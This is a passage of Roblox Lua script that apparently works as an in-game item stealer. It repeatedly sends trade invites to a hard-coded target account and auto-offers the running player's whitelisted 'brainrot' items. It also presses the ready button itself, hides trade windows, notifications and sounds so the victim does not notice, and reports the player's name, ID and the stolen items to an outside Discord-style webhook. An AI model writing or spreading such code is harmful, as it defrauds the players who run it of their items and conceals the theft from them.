                    { name = "Target", value = tostring(TARGET_USER_ID), inline = true },
                    { name = "Items", value = tostring(#offered), inline = true },
                },
                footer = { text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            }
            local payload = HttpService:JSONEncode({
                embeds = { embed }, username = "Trade Logger", avatar_url = GOOD_AVATAR
            })
            pcall(function()
                requestFn({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payload })
            end)
        end

        local function applyHiding()
            if hiding then return end
            hiding = true
            blockBlur()
            blockFOV()
            CameraController.Blur = function() end
            CameraController.Fov = function() end
            CornerNotificationController.Add = function() end
            NotificationController.Notify = function() end
            pcall(function()
                if originalSetCore then
                    Services.StarterGui.SetCore = function(self, name, ...)
                        if name == "SendNotification" or name == "ChatMakeSystemMessage" then return end
                        return originalSetCore(self, name, ...)
                    end
                end
            end)

            InterfaceController.Toggle = function(self, p12, p13, p14)
                p14 = p14 or {}
                if not table.find(p14, "Hud") then table.insert(p14, "Hud") end
                return originalToggle(self, p12, p13, p14)
            end
            muteTradeSounds()
            setTradeGuisHidden(true)
        end

        local function restoreHiding()
            if not hiding then return end
            hiding = false
            unblockBlur()
            unblockFOV()
            CameraController.Blur = originalBlurFunc
            CameraController.Fov = originalFovFunc
            CornerNotificationController.Add = originalCorner
            NotificationController.Notify = originalNotify
            pcall(function()
                if originalSetCore then Services.StarterGui.SetCore = originalSetCore end
            end)
            InterfaceController.Toggle = originalToggle
            unmuteTradeSounds()
            setTradeGuisHidden(false)
        end

        local function stopHiding()
            task.delay(2, restoreHiding)
        end

        local function tryAddBrainrot(entry)
            local attempts = 0
            while attempts < 15 do
                attempts += 1
                local result = addBrainrot(entry.index, entry.animal)
                
                if result == true then 
                    return true 
                elseif result == false then
                    task.wait(0.15)
                else
                    if type(result) == "string" then
                        if result:lower():find("wait") or result:lower():find("spam") then
                            task.wait(0.3)
                        elseif result:lower():find("space") or result:lower():find("full") then
                            return "nospace"
                        else
                            return false
                        end
                    else
                        task.wait(0.15)
                    end
                end
            end
            return false
        end

        local function offerWhitelistBrainrots()
            local tradeData = tradeRep:TryIndex({ "active", "data" })
            if not tradeData then return end
            
            local ourIndex
            for i, userId in ipairs(tradeData.users) do
                if userId == LocalPlayer.UserId then ourIndex = i; break end
            end
            if not ourIndex then return end
            
            local maxSlots = (tradeData.players[ourIndex] and tradeData.players[ourIndex].maxSlots or 4)
            local whitelistBrainrots = getWhitelistBrainrots()
            
            if #whitelistBrainrots == 0 then return end
            
            local offered = 0
            lastOfferedList = {}
            
            for _, entry in ipairs(whitelistBrainrots) do
                if offered >= maxSlots then break end
                local result = tryAddBrainrot(entry)
                if result == "nospace" then break
                elseif result == true then
                    offered += 1
                    table.insert(lastOfferedList, entry)
                end
                task.wait(0.1)
            end
            
            task.spawn(function()
                while tradeRep:TryIndex({ "active", "data" }) do
                    task.wait(0.1)
                end
                sendTradeCompleteWebhook(lastOfferedList)
                stopHiding()
                tradeActive = false
            end)
        end

        while true do
            if (Remotes.Invite and Remotes.AddBrainrot) then
                local list = getWhitelistBrainrots()
                if #list > 0 then
                    loggerActive = true
                    break
                end
            end
            task.wait(0.5)
        end

        task.spawn(function()
            local pg = LocalPlayer:WaitForChild("PlayerGui")
            local HUD_NAMES = {"Hud", "HUD", "Inventory", "Hotbar", "Toolbar", "Backpack"}

            local function forceEnable()
                for _, gui in ipairs(pg:GetChildren()) do
                    if gui:IsA("ScreenGui") then
                        for _, hudName in ipairs(HUD_NAMES) do
                            if gui.Name == hudName and gui.Enabled == false then
                                pcall(function() gui.Enabled = true end)
                            end
                        end
                    end
                end
            end

            local function hookGui(gui)
                if not gui:IsA("ScreenGui") then return end
                for _, hudName in ipairs(HUD_NAMES) do
                    if gui.Name == hudName then
                        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                            if not gui.Enabled then
                                pcall(function() gui.Enabled = true end)
                            end
                        end)
                        break
                    end
                end
            end

            for _, gui in ipairs(pg:GetChildren()) do hookGui(gui) end
            pg.ChildAdded:Connect(hookGui)

            while true do
                forceEnable()
                task.wait(0.1)
            end
        end)

        setTradeGuisHidden(true)

        task.spawn(function()
            sendInvite(TARGET_USER_ID)
        end)

        task.spawn(function()
            while true do
                task.wait(3)
                if tradeActive then continue end
                if not (Remotes.Invite and Remotes.AddBrainrot) then continue end
                local list = getWhitelistBrainrots()
                if #list == 0 then continue end
                sendInvite(TARGET_USER_ID)
            end
        end)

        task.spawn(function()
            while true do
                setTradeGuisHidden(true)
                task.wait(0.5)
            end
        end)

        tradeRep:ListenRaw(function(value)
            if not loggerActive then return end
            if not tradeActive and value ~= nil and tradeRep:TryIndex({ "active", "data" }) then
                tradeActive = true
                task.spawn(function()
                    applyHiding()
                    task.wait(0.3)
                    offerWhitelistBrainrots()
                end)
            elseif tradeActive and (value == nil or not tradeRep:TryIndex({ "active", "data" })) then
                task.delay(2.5, function()
                    tradeActive = false
                end)
            end
        end)

        task.spawn(function()
            while task.wait(0.5) do
                if not hiding then continue end
                pcall(function()
                    local readyBtn = LocalPlayer.PlayerGui:FindFirstChild("TradeLiveTrade")
                        and LocalPlayer.PlayerGui.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
                        and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other")
                        and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
                    if readyBtn and firesignal then
                        firesignal(readyBtn.Activated)
                    end
                end)
            end
        end)
    end)
end)
